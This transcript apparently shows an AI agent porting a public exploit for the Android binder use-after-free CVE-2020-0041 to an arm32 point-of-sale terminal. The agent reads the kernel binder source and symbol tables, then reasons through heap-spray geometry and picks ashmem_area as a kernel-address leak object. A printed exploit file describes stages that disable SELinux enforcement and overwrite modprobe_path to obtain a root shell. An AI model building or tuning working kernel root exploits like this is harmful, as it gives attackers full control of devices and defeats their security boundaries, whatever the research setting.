				/*
				 * tmp_refs could have changed so
				 * check it again
				 */
				if (node->tmp_refs) {
					spin_unlock(&binder_dead_nodes_lock);
					return false;
				}
				hlist_del(&node->dead_node);
				spin_unlock(&binder_dead_nodes_lock);
				binder_debug(BINDER_DEBUG_INTERNAL_REFS,
					     "dead node %d deleted\n",
					     node->debug_id);
			}
			return true;
		}
	}
	return false;
}

static void binder_dec_node(struct binder_node *node, int strong, int internal)
{
	bool free_node;

	binder_node_inner_lock(node);
	free_node = binder_dec_node_nilocked(node, strong, internal);
	binder_node_inner_unlock(node);
	if (free_node)
		binder_free_node(node);
}

static void binder_inc_node_tmpref_ilocked(struct binder_node *node)
{
	/*
	 * No call to binder_inc_node() is needed since we
	 * don't need to inform userspace of any changes to
	 * tmp_refs
	 */
	node->tmp_refs++;
}

/**
 * binder_inc_node_tmpref() - take a temporary reference on node
 * @node:	node to reference
 *
 * Take reference on node to prevent the node from being freed
 * while referenced only by a local variable. The inner lock is
 * needed to serialize with the node work on the queue (which
 * isn't needed after the node is dead). If the node is dead
 * (node->proc is NULL), use binder_dead_nodes_lock to protect
 * node->tmp_refs against dead-node-only cases where the node
 * lock cannot be acquired (eg traversing the dead node list to
 * print nodes)
 */
static void binder_inc_node_tmpref(struct binder_node *node)
{
	binder_node_lock(node);
	if (node->proc)
		binder_inner_proc_lock(node->proc);
	else

[4220 more lines in file. Use offset=1347 to continue.]

[assistant • read]
{"limit":120,"offset":1100,"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref/414_binder.c"}

[tool • read]
static struct binder_node *binder_get_node(struct binder_proc *proc,
					   binder_uintptr_t ptr)
{
	struct binder_node *node;

	binder_inner_proc_lock(proc);
	node = binder_get_node_ilocked(proc, ptr);
	binder_inner_proc_unlock(proc);
	return node;
}

static struct binder_node *binder_init_node_ilocked(
						struct binder_proc *proc,
						struct binder_node *new_node,
						struct flat_binder_object *fp)
{
	struct rb_node **p = &proc->nodes.rb_node;
	struct rb_node *parent = NULL;
	struct binder_node *node;
	binder_uintptr_t ptr = fp ? fp->binder : 0;
	binder_uintptr_t cookie = fp ? fp->cookie : 0;
	__u32 flags = fp ? fp->flags : 0;

	assert_spin_locked(&proc->inner_lock);

	while (*p) {

		parent = *p;
		node = rb_entry(parent, struct binder_node, rb_node);

		if (ptr < node->ptr)
			p = &(*p)->rb_left;
		else if (ptr > node->ptr)
			p = &(*p)->rb_right;
		else {
			/*
			 * A matching node is already in
			 * the rb tree. Abandon the init
			 * and return it.
			 */
			binder_inc_node_tmpref_ilocked(node);
			return node;
		}
	}
	node = new_node;
	binder_stats_created(BINDER_STAT_NODE);
	node->tmp_refs++;
	rb_link_node(&node->rb_node, parent, p);
	rb_insert_color(&node->rb_node, &proc->nodes);
	node->debug_id = atomic_inc_return(&binder_last_id);
	node->proc = proc;
	node->ptr = ptr;
	node->cookie = cookie;
	node->work.type = BINDER_WORK_NODE;
	node->min_priority = flags & FLAT_BINDER_FLAG_PRIORITY_MASK;
	node->accept_fds = !!(flags & FLAT_BINDER_FLAG_ACCEPTS_FDS);
	spin_lock_init(&node->lock);
	INIT_LIST_HEAD(&node->work.entry);
	INIT_LIST_HEAD(&node->async_todo);
	binder_debug(BINDER_DEBUG_INTERNAL_REFS,
		     "%d:%d node %d u%016llx c%016llx created\n",
		     proc->pid, current->pid, node->debug_id,
		     (u64)node->ptr, (u64)node->cookie);

	return node;
}

static struct binder_node *binder_new_node(struct binder_proc *proc,
					   struct flat_binder_object *fp)
{
	struct binder_node *node;
	struct binder_node *new_node = kzalloc(sizeof(*node), GFP_KERNEL);

	if (!new_node)
		return NULL;
	binder_inner_proc_lock(proc);
	node = binder_init_node_ilocked(proc, new_node, fp);
	binder_inner_proc_unlock(proc);
	if (node != new_node)
		/*
		 * The node was already added by another thread
		 */
		kfree(new_node);

	return node;
}

static void binder_free_node(struct binder_node *node)
{
	kfree(node);
	binder_stats_deleted(BINDER_STAT_NODE);
}

static int binder_inc_node_nilocked(struct binder_node *node, int strong,
				    int internal,
				    struct list_head *target_list)
{
	struct binder_proc *proc = node->proc;

	assert_spin_locked(&node->lock);
	if (proc)
		assert_spin_locked(&proc->inner_lock);
	if (strong) {
		if (internal) {
			if (target_list == NULL &&
			    node->internal_strong_refs == 0 &&
			    !(node->proc &&
			      node == node->proc->context->binder_context_mgr_node &&
			      node->has_strong_ref)) {
				pr_err("invalid inc strong node for %d\n",
					node->debug_id);
				return -EINVAL;
			}
			node->internal_strong_refs++;
		} else
			node->local_strong_refs++;
		if (!node->has_strong_ref && target_list) {
			binder_dequeue_work_ilocked(&node->work);
			binder_enqueue_work_ilocked(&node->work, target_list);
		}

[4347 more lines in file. Use offset=1220 to continue.]

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && grep -n 'binder_translate_binder\\|binder_get_node_refs_for_txn\\|rdata->debug_id\\|ref->node' 414_binder.c | head -20; echo ===; sed -n '/static void binder_transaction(/,/binder_get_node_refs_for_txn\\|cookie == node->cookie/p' 414_binder.c 2>/dev/null | head -5"}

[tool • bash]
476: * @refs_by_node:         rbtree of refs ordered by ref->node
1446:		if (node < ref->node)
1448:		else if (node > ref->node)
1459:	new_ref->node = node;
1487:	hlist_add_head(&new_ref->node_entry, &node->refs);
1504:		      ref->node->debug_id);
1509:	binder_node_inner_lock(ref->node);
1511:		binder_dec_node_nilocked(ref->node, 1, 1);
1513:	hlist_del(&ref->node_entry);
1514:	delete_node = binder_dec_node_nilocked(ref->node, 0, 1);
1515:	binder_node_inner_unlock(ref->node);
1517:	 * Clear ref->node unless we want the caller to free the node
1521:		 * The caller uses ref->node to determine
1525:		ref->node = NULL;
1556:			ret = binder_inc_node(ref->node, 1, 1, target_list);
1563:			ret = binder_inc_node(ref->node, 0, 1, target_list);
1593:			binder_dec_node(ref->node, strong, 1);
1634:	node = ref->node;
1655: * Free the binder_ref. Free the binder_node indicated by ref->node
1660:	if (ref->node)
===
static void binder_transaction(struct binder_proc *proc,
			       struct binder_thread *thread,
			       struct binder_transaction_data *tr, int reply,
			       binder_size_t extra_buffers_size)
{


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && grep -n 'static struct binder_node \\*binder_get_node_refs_for_txn\\|binder_translate_binder(' 414_binder.c 414_binder_alloc.c aosp414.c vanilla414b.c vanilla_414_binder.c 2>/dev/null | head; echo ===; grep -n 'cookie != node->cookie\\|fp->cookie' 414_binder.c | head"}

[tool • bash]
414_binder.c:2232:static int binder_translate_binder(struct flat_binder_object *fp,
414_binder.c:2606:static struct binder_node *binder_get_node_refs_for_txn(
414_binder.c:2945:			ret = binder_translate_binder(fp, t, thread);
vanilla414b.c:2232:static int binder_translate_binder(struct flat_binder_object *fp,
vanilla414b.c:2606:static struct binder_node *binder_get_node_refs_for_txn(
vanilla414b.c:2945:			ret = binder_translate_binder(fp, t, thread);
===
1120:	binder_uintptr_t cookie = fp ? fp->cookie : 0;
2248:	if (fp->cookie != node->cookie) {
2251:				  node->debug_id, (u64)fp->cookie,
2273:	fp->cookie = 0;
2314:		fp->cookie = node->cookie;
2340:		fp->cookie = 0;
3301:			if (cookie != node->cookie) {


[assistant • read]
{"limit":80,"offset":2600,"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref/414_binder.c"}

[tool • read]
 * constructing the transaction, so we take that here as well.
 *
 * Return: The target_node with refs taken or NULL if no @node->proc is NULL.
 * Also sets @proc if valid. If the @node->proc is NULL indicating that the
 * target proc has died, @error is set to BR_DEAD_REPLY
 */
static struct binder_node *binder_get_node_refs_for_txn(
		struct binder_node *node,
		struct binder_proc **procp,
		uint32_t *error)
{
	struct binder_node *target_node = NULL;

	binder_node_inner_lock(node);
	if (node->proc) {
		target_node = node;
		binder_inc_node_nilocked(node, 1, 0, NULL);
		binder_inc_node_tmpref_ilocked(node);
		node->proc->tmp_ref++;
		*procp = node->proc;
	} else
		*error = BR_DEAD_REPLY;
	binder_node_inner_unlock(node);

	return target_node;
}

static void binder_transaction(struct binder_proc *proc,
			       struct binder_thread *thread,
			       struct binder_transaction_data *tr, int reply,
			       binder_size_t extra_buffers_size)
{
	int ret;
	struct binder_transaction *t;
	struct binder_work *tcomplete;
	binder_size_t *offp, *off_end, *off_start;
	binder_size_t off_min;
	u8 *sg_bufp, *sg_buf_end;
	struct binder_proc *target_proc = NULL;
	struct binder_thread *target_thread = NULL;
	struct binder_node *target_node = NULL;
	struct binder_transaction *in_reply_to = NULL;
	struct binder_transaction_log_entry *e;
	uint32_t return_error = 0;
	uint32_t return_error_param = 0;
	uint32_t return_error_line = 0;
	struct binder_buffer_object *last_fixup_obj = NULL;
	binder_size_t last_fixup_min_off = 0;
	struct binder_context *context = proc->context;
	int t_debug_id = atomic_inc_return(&binder_last_id);

	e = binder_transaction_log_add(&binder_transaction_log);
	e->debug_id = t_debug_id;
	e->call_type = reply ? 2 : !!(tr->flags & TF_ONE_WAY);
	e->from_proc = proc->pid;
	e->from_thread = thread->pid;
	e->target_handle = tr->target.handle;
	e->data_size = tr->data_size;
	e->offsets_size = tr->offsets_size;
	e->context_name = proc->context->name;

	if (reply) {
		binder_inner_proc_lock(proc);
		in_reply_to = thread->transaction_stack;
		if (in_reply_to == NULL) {
			binder_inner_proc_unlock(proc);
			binder_user_error("%d:%d got reply transaction with no transaction stack\n",
					  proc->pid, thread->pid);
			return_error = BR_FAILED_REPLY;
			return_error_param = -EPROTO;
			return_error_line = __LINE__;
			goto err_empty_call_stack;
		}
		if (in_reply_to->to_thread != thread) {
			spin_lock(&in_reply_to->lock);
			binder_user_error("%d:%d got reply transaction with bad transaction stack, transaction %d has target %d:%d\n",
				proc->pid, thread->pid, in_reply_to->debug_id,
				in_reply_to->to_proc ?
				in_reply_to->to_proc->pid : 0,
				in_reply_to->to_thread ?

[2887 more lines in file. Use offset=2680 to continue.]

[assistant • read]
{"limit":115,"offset":2232,"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref/414_binder.c"}

[tool • read]
static int binder_translate_binder(struct flat_binder_object *fp,
				   struct binder_transaction *t,
				   struct binder_thread *thread)
{
	struct binder_node *node;
	struct binder_proc *proc = thread->proc;
	struct binder_proc *target_proc = t->to_proc;
	struct binder_ref_data rdata;
	int ret = 0;

	node = binder_get_node(proc, fp->binder);
	if (!node) {
		node = binder_new_node(proc, fp);
		if (!node)
			return -ENOMEM;
	}
	if (fp->cookie != node->cookie) {
		binder_user_error("%d:%d sending u%016llx node %d, cookie mismatch %016llx != %016llx\n",
				  proc->pid, thread->pid, (u64)fp->binder,
				  node->debug_id, (u64)fp->cookie,
				  (u64)node->cookie);
		ret = -EINVAL;
		goto done;
	}
	if (security_binder_transfer_binder(proc->tsk, target_proc->tsk)) {
		ret = -EPERM;
		goto done;
	}

	ret = binder_inc_ref_for_node(target_proc, node,
			fp->hdr.type == BINDER_TYPE_BINDER,
			&thread->todo, &rdata);
	if (ret)
		goto done;

	if (fp->hdr.type == BINDER_TYPE_BINDER)
		fp->hdr.type = BINDER_TYPE_HANDLE;
	else
		fp->hdr.type = BINDER_TYPE_WEAK_HANDLE;
	fp->binder = 0;
	fp->handle = rdata.desc;
	fp->cookie = 0;

	trace_binder_transaction_node_to_ref(t, node, &rdata);
	binder_debug(BINDER_DEBUG_TRANSACTION,
		     "        node %d u%016llx -> ref %d desc %d\n",
		     node->debug_id, (u64)node->ptr,
		     rdata.debug_id, rdata.desc);
done:
	binder_put_node(node);
	return ret;
}

static int binder_translate_handle(struct flat_binder_object *fp,
				   struct binder_transaction *t,
				   struct binder_thread *thread)
{
	struct binder_proc *proc = thread->proc;
	struct binder_proc *target_proc = t->to_proc;
	struct binder_node *node;
	struct binder_ref_data src_rdata;
	int ret = 0;

	node = binder_get_node_from_ref(proc, fp->handle,
			fp->hdr.type == BINDER_TYPE_HANDLE, &src_rdata);
	if (!node) {
		binder_user_error("%d:%d got transaction with invalid handle, %d\n",
				  proc->pid, thread->pid, fp->handle);
		return -EINVAL;
	}
	if (security_binder_transfer_binder(proc->tsk, target_proc->tsk)) {
		ret = -EPERM;
		goto done;
	}

	binder_node_lock(node);
	if (node->proc == target_proc) {
		if (fp->hdr.type == BINDER_TYPE_HANDLE)
			fp->hdr.type = BINDER_TYPE_BINDER;
		else
			fp->hdr.type = BINDER_TYPE_WEAK_BINDER;
		fp->binder = node->ptr;
		fp->cookie = node->cookie;
		if (node->proc)
			binder_inner_proc_lock(node->proc);
		binder_inc_node_nilocked(node,
					 fp->hdr.type == BINDER_TYPE_BINDER,
					 0, NULL);
		if (node->proc)
			binder_inner_proc_unlock(node->proc);
		trace_binder_transaction_ref_to_node(t, node, &src_rdata);
		binder_debug(BINDER_DEBUG_TRANSACTION,
			     "        ref %d desc %d -> node %d u%016llx\n",
			     src_rdata.debug_id, src_rdata.desc, node->debug_id,
			     (u64)node->ptr);
		binder_node_unlock(node);
	} else {
		struct binder_ref_data dest_rdata;

		binder_node_unlock(node);
		ret = binder_inc_ref_for_node(target_proc, node,
				fp->hdr.type == BINDER_TYPE_HANDLE,
				NULL, &dest_rdata);
		if (ret)
			goto done;

		fp->binder = 0;
		fp->handle = dest_rdata.desc;
		fp->cookie = 0;
		trace_binder_transaction_ref_to_ref(t, node, &src_rdata,
						    &dest_rdata);
		binder_debug(BINDER_DEBUG_TRANSACTION,
			     "        ref %d desc %d -> ref %d desc %d (node %d)\n",
			     src_rdata.debug_id, src_rdata.desc,
			     dest_rdata.debug_id, dest_rdata.desc,

[3220 more lines in file. Use offset=2347 to continue.]

[assistant • read]
{"limit":90,"offset":1424,"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref/414_binder.c"}

[tool • read]
 *
 * Return:	the ref for node. It is possible that another thread
 *		allocated/initialized the ref first in which case the
 *		returned ref would be different than the passed-in
 *		new_ref. new_ref must be kfree'd by the caller in
 *		this case.
 */
static struct binder_ref *binder_get_ref_for_node_olocked(
					struct binder_proc *proc,
					struct binder_node *node,
					struct binder_ref *new_ref)
{
	struct binder_context *context = proc->context;
	struct rb_node **p = &proc->refs_by_node.rb_node;
	struct rb_node *parent = NULL;
	struct binder_ref *ref;
	struct rb_node *n;

	while (*p) {
		parent = *p;
		ref = rb_entry(parent, struct binder_ref, rb_node_node);

		if (node < ref->node)
			p = &(*p)->rb_left;
		else if (node > ref->node)
			p = &(*p)->rb_right;
		else
			return ref;
	}
	if (!new_ref)
		return NULL;

	binder_stats_created(BINDER_STAT_REF);
	new_ref->data.debug_id = atomic_inc_return(&binder_last_id);
	new_ref->proc = proc;
	new_ref->node = node;
	rb_link_node(&new_ref->rb_node_node, parent, p);
	rb_insert_color(&new_ref->rb_node_node, &proc->refs_by_node);

	new_ref->data.desc = (node == context->binder_context_mgr_node) ? 0 : 1;
	for (n = rb_first(&proc->refs_by_desc); n != NULL; n = rb_next(n)) {
		ref = rb_entry(n, struct binder_ref, rb_node_desc);
		if (ref->data.desc > new_ref->data.desc)
			break;
		new_ref->data.desc = ref->data.desc + 1;
	}

	p = &proc->refs_by_desc.rb_node;
	while (*p) {
		parent = *p;
		ref = rb_entry(parent, struct binder_ref, rb_node_desc);

		if (new_ref->data.desc < ref->data.desc)
			p = &(*p)->rb_left;
		else if (new_ref->data.desc > ref->data.desc)
			p = &(*p)->rb_right;
		else
			BUG();
	}
	rb_link_node(&new_ref->rb_node_desc, parent, p);
	rb_insert_color(&new_ref->rb_node_desc, &proc->refs_by_desc);

	binder_node_lock(node);
	hlist_add_head(&new_ref->node_entry, &node->refs);

	binder_debug(BINDER_DEBUG_INTERNAL_REFS,
		     "%d new ref %d desc %d for node %d\n",
		      proc->pid, new_ref->data.debug_id, new_ref->data.desc,
		      node->debug_id);
	binder_node_unlock(node);
	return new_ref;
}

static void binder_cleanup_ref_olocked(struct binder_ref *ref)
{
	bool delete_node = false;

	binder_debug(BINDER_DEBUG_INTERNAL_REFS,
		     "%d delete ref %d desc %d for node %d\n",
		      ref->proc->pid, ref->data.debug_id, ref->data.desc,
		      ref->node->debug_id);

	rb_erase(&ref->rb_node_desc, &ref->proc->refs_by_desc);
	rb_erase(&ref->rb_node_node, &ref->proc->refs_by_node);

	binder_node_inner_lock(ref->node);
	if (ref->data.strong)
		binder_dec_node_nilocked(ref->node, 1, 1);

	hlist_del(&ref->node_entry);

[4053 more lines in file. Use offset=1514 to continue.]

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '1514,1560p' 414_binder.c; echo ===inc_ref_for_node range===; grep -n 'static int binder_inc_ref_for_node' 414_binder.c"}

[tool • bash]
	delete_node = binder_dec_node_nilocked(ref->node, 0, 1);
	binder_node_inner_unlock(ref->node);
	/*
	 * Clear ref->node unless we want the caller to free the node
	 */
	if (!delete_node) {
		/*
		 * The caller uses ref->node to determine
		 * whether the node needs to be freed. Clear
		 * it since the node is still alive.
		 */
		ref->node = NULL;
	}

	if (ref->death) {
		binder_debug(BINDER_DEBUG_DEAD_BINDER,
			     "%d delete ref %d desc %d has death notification\n",
			      ref->proc->pid, ref->data.debug_id,
			      ref->data.desc);
		binder_dequeue_work(ref->proc, &ref->death->work);
		binder_stats_deleted(BINDER_STAT_DEATH);
	}
	binder_stats_deleted(BINDER_STAT_REF);
}

/**
 * binder_inc_ref_olocked() - increment the ref for given handle
 * @ref:         ref to be incremented
 * @strong:      if true, strong increment, else weak
 * @target_list: list to queue node work on
 *
 * Increment the ref. @ref->proc->outer_lock must be held on entry
 *
 * Return: 0, if successful, else errno
 */
static int binder_inc_ref_olocked(struct binder_ref *ref, int strong,
				  struct list_head *target_list)
{
	int ret;

	if (strong) {
		if (ref->data.strong == 0) {
			ret = binder_inc_node(ref->node, 1, 1, target_list);
			if (ret)
				return ret;
		}
		ref->data.strong++;
===inc_ref_for_node range===
1742:static int binder_inc_ref_for_node(struct binder_proc *proc,


[assistant • read]
{"limit":75,"offset":1742,"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref/414_binder.c"}

[tool • read]
static int binder_inc_ref_for_node(struct binder_proc *proc,
			struct binder_node *node,
			bool strong,
			struct list_head *target_list,
			struct binder_ref_data *rdata)
{
	struct binder_ref *ref;
	struct binder_ref *new_ref = NULL;
	int ret = 0;

	binder_proc_lock(proc);
	ref = binder_get_ref_for_node_olocked(proc, node, NULL);
	if (!ref) {
		binder_proc_unlock(proc);
		new_ref = kzalloc(sizeof(*ref), GFP_KERNEL);
		if (!new_ref)
			return -ENOMEM;
		binder_proc_lock(proc);
		ref = binder_get_ref_for_node_olocked(proc, node, new_ref);
	}
	ret = binder_inc_ref_olocked(ref, strong, target_list);
	*rdata = ref->data;
	binder_proc_unlock(proc);
	if (new_ref && ref != new_ref)
		/*
		 * Another thread created the ref first so
		 * free the one we allocated
		 */
		kfree(new_ref);
	return ret;
}

static void binder_pop_transaction_ilocked(struct binder_thread *target_thread,
					   struct binder_transaction *t)
{
	BUG_ON(!target_thread);
	assert_spin_locked(&target_thread->proc->inner_lock);
	BUG_ON(target_thread->transaction_stack != t);
	BUG_ON(target_thread->transaction_stack->from != target_thread);
	target_thread->transaction_stack =
		target_thread->transaction_stack->from_parent;
	t->from = NULL;
}

/**
 * binder_thread_dec_tmpref() - decrement thread->tmp_ref
 * @thread:	thread to decrement
 *
 * A thread needs to be kept alive while being used to create or
 * handle a transaction. binder_get_txn_from() is used to safely
 * extract t->from from a binder_transaction and keep the thread
 * indicated by t->from from being freed. When done with that
 * binder_thread, this function is called to decrement the
 * tmp_ref and free if appropriate (thread has been released
 * and no transaction being processed by the driver)
 */
static void binder_thread_dec_tmpref(struct binder_thread *thread)
{
	/*
	 * atomic is used to protect the counter value while
	 * it cannot reach zero or thread->is_dead is false
	 */
	binder_inner_proc_lock(thread->proc);
	atomic_dec(&thread->tmp_ref);
	if (thread->is_dead && !atomic_read(&thread->tmp_ref)) {
		binder_inner_proc_unlock(thread->proc);
		binder_free_thread(thread);
		return;
	}
	binder_inner_proc_unlock(thread->proc);
}

/**
 * binder_proc_dec_tmpref() - decrement proc->tmp_ref
 * @proc:	proc to decrement

[3750 more lines in file. Use offset=1817 to continue.]

[assistant]
<acp tokens="177" type="text" time="2026-11-15 14:44:21">m05235</acp>


The refcount choreography is deeply interlocked — rather than re-derive it all from scratch (risking errors in the model where BFS empirically worked), I'll port BFS's choreography mechanics directly and validate each stage on-device with binder debug traces. One critical discovery from my re-derivation: **`struct ashmem_area` on arm32 is a kmalloc-96 object with a self-pointed `unpinned_list` at +0x40** — which fits the `node+0x38/+0x40` leak window perfectly (name[] controls +0x30..0x40 = the ptr window, unpinned_list.next/prev self-point at +0x40 = the cookie window). That gives a deterministic kaddr leak replacing BFS's arm64 epitem dance. Verifying the ashmem struct against the 4.14 source:

[assistant • bash]
{"command":"cd /tmp 2>/dev/null; cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && grep -E 'CONFIG_ASHMEM' tmp/m3/gl/config_full.txt tmp/m3/config_full.txt 2>/dev/null; find . -name 'ashmem*4.14*' -o -name '414_ashmem*' 2>/dev/null | head; ls tmp/m3/ | grep -i ashmem | head"}

[tool • bash]
tmp/m3/gl/config_full.txt:CONFIG_ASHMEM=y
ashmemd_aidl.so
ashmemd_bin
code_ashmem_ioctl.bin
code_ashmem_mmap.bin
ctl_ashmem_device.txt
disa_ashmem_ioctl.txt
disa_ashmem_mmap.txt
disa_ashmem_open.txt
dx_ashmem_device_service.words
nat_ctl_ashmem_device.elf


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -E ' ashmem_area| ashmem_pin| ashmem_range' kallsyms.txt | head; python3 kdis.py ashmem_mmap --next 2>/dev/null | head -5; grep -n 'ASHMEM_SET_NAME\\|ASHMEM_UNPIN\\|ashmem_pin' disa_ashmem_ioctl.txt 2>/dev/null | head"}

[tool • bash]
c110a99c d ashmem_area_cachep
c110a9a0 d ashmem_range_cachep


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -E 'T ashmem|t ashmem_mmap\\b' kallsyms.txt | head"}

[tool • bash]
c085da44 t ashmem_mmap


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -E ' c08[0-9a-f]{5} [tT] ashmem' kallsyms.txt"}

[tool • bash]
(no output)

Command exited with code 1

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -E 'ashmem' kallsyms.txt | head -30"}

[tool • bash]
c085d7f0 t ashmem_vmfile_mmap
c085d80c t ashmem_vmfile_get_unmapped_area
c085d850 t ashmem_shrink_count
c085d924 t ashmem_release
c085d9b0 t ashmem_open
c085da44 t ashmem_mmap
c085decc t ashmem_read_iter
c085df60 t ashmem_llseek
c085e014 t ashmem_shrink_scan
c085e138 t ashmem_ioctl
c0bb3250 r ashmem_fops
c10455c8 t ashmem_init
c10a4b48 t __initcall_ashmem_init6
c110a99c d ashmem_area_cachep
c110a9a0 d ashmem_range_cachep
c1215e2c d ashmem_misc
c1215e54 d ashmem_shrinker
c1215e74 d ashmem_mutex
c1215e88 d ashmem_lru_list


[assistant]
<acp tokens="38" type="text" time="2026-11-15 14:45:54">m05246</acp>
The choreography details (esp. the fake-node region overlap at `+0xe8` and the "second" BBO variant) were capture in a compressed block. Restoring it:

[assistant]
<acp tokens="177" type="text" time="2026-11-15 14:49:46">m05297</acp>


Critical geometry re-derived and confirmed (I recomputed from the vulnerable pre-rework `binder_validate_fixup` semantics): BFS's offsets array has **4 u64 entries** (`[0]=FBO@0, [1]=sg BBO@0x40, [2]=parent-6@0x68, [3]=copy-in BBO@0x90`), data_size=0xb8, offset array at data+0xb8, so `offs[6]` = data+0xe8 — and the sg region starts at 0xd8 with the 16-byte sg copy landing 0xd8..0xe8, so the final 8-byte copy-in lands **exactly at data+0xe8 = offs[6]**, overwriting 0x40→0x18. This works identically on arm32 because ALIGN(data_size,4)=ALIGN(data_size,8)=0xb8. The trigger transaction bytes therefore port **verbatim**.

The remaining unknown is the realloc vehicle. Checking what b66 recorded about it:

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/work && grep -n 'realloc\\|sendmsg\\|kmalloc-96\\|kmalloc-128\\|ashmem' b66_full.md | head -25"}

[tool • bash]
7:{"content":"/*\n * t37.c — CVE-2020-0041 (binder num_valid x8/÷8 bug) arm32 port for NP-9220\n *          kernel 4.14.133 (Sunmi/spred Unisoc sl8541e-class MTK POS terminal)\n *\n * Derived from Blue Frost Security's public lpe exploit for CVE-2020-0041\n * (https://github.com/BlueFrostSecurity/CVE-2020-0041), heavily restructured\n * for arm32 + this device. Original authors: D. van der Helm / BFS. GPLv2.\n *\n * Deltas vs BFS original (see evidence/E-057_cve-2020-0041_arm32_port.md).\n * Target: write gadget *(u32*)where = what via dead-node release walk.\n * Payload stages (mode argument):\n *   0 = staging-only sanity checks (no UAF fire, no write)\n *   1 = staging + UAF fire + leak attempt (read-only)\n *   2 = staging + UAF fire + leak + one write32 what=0 @selinux_enforcing\n *   3 = staging + selinux + modprobe_path overwrite + root shell via /dev/x\n */\n\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdint.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <string.h>\n#include <errno.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <sched.h>\n#include <poll.h>\n#include <pthread.h>\n#include <sys/syscall.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <sys/socket.h>\n#include <sys/mman.h>\n#include <sys/epoll.h>\n#include <sys/ioctl.h>\n\n#include \"uapi_binder.h\"   /* copied v4.14 binder uapi (see m3 dir) */\n\n/* ------------------------------------------------------------------ */\n/* Logging                                                             */\n/* ------------------------------------------------------------------ */\nstatic int g_logfd = -1;\nstatic void log_open(const char *path) { g_logfd = open(path, O_WRONLY|O_CREAT|O_APPEND|O_SYNC, 0644); }\nstatic void __attribute__((format(printf,1,2))) li(const char *fmt, ...)\n{\n\tchar b[512]; va_list ap; va_start(ap, fmt); int n = vsnprintf(b, sizeof(b), fmt, ap); va_end(ap);\n\tb[n++] = '\\n';\n\twrite(2, b, n);\n\tif (g_logfd >= 0) write(g_logf

...[truncated for context space] — original ~6665 tokens]...

}\n\tclose(cfds[1]);\n\tchar ack; if (read(cfds[0], &ack, 1) != 1 || ack != 'R') { le(\"[stage1] endpoint ack failed ep=%d\", ep); return 1; }\n\tli(\"[stage1] endpoint forked pid=%d registered as ctx mgr on /dev/binder0\", ep);\n\n\t/* Client: grab handle 0 (the endpoint ctx mgr) and send EXCHANGE_HANDLES. */\n\tli(\"[stage1] sending EXCHANGE_HANDLES to handle 0\");\n\t/* ... (implemented in t37_full() — see stage 2) */\n\t(void)NUM_PENDING_NODE;\n\t(void)REALL_CMSG_SZ;\n\t(void)RES_PRIME_0x40;\n\treturn run_stage(mode, bs, ep, cfds[0]);\n}\n","path":"EDC_newpos_9220/tmp/m3/gl/t37.c"}
43:-rw-rw-r-- 1 enryu enryu  6036 Nov 15 10:34 realloc.c
52:   253 tmp/m3/bfs_ref/lpe/src/realloc.c
71:realloc.h
105:LOCAL_SRC_FILES := src/exploit.c src/endpoint.c src/pending_node.c src/binder.c src/log.c src/helpers.c  src/binder_lookup.c src/realloc.c src/node.c
130:#include <linux/ashmem.h>
657:   /* Spawn the threads used for reallocating the dangling `binder_node` with controlled data. */
658:	spawn_realloc_threads();
665:   while (!node_realloc_epitem(file, pipes[0]))
846:   /* Cleanup the `sendmsg()` threads, which hold a reference to the freed 
878:   log_info("[+] Cleaned up sendmsg threads\n");
899:   cleanup_realloc_threads();
1167: * Free a `binder_node` and reallocates an `epitem` structure
1170:bool node_realloc_epitem(struct exp_node *node, int fd)
1205:   /* Try to reallocate with `struct epitem`. */
1252:   while (!node_realloc_epitem(node2, node1->target_fd))
1296: * with controlled content using the `sendmsg()` threads to do so. The only trouble being
1298: * it gets tricky to reliably reallocate the content of the `binder_node`.
1300:bool node_realloc_content(struct exp_node *node, void *data, size_t size)
1309:   setup_realloc_buffer(data, size);
1326:      reset_realloc_threads();
1334:   realloc_barrier_wait();
1340:   /* Double check to see if the node content was realloc properly. */
1344:      if (discard_realloc_thread(B))
1348:   reset_realloc_threads();
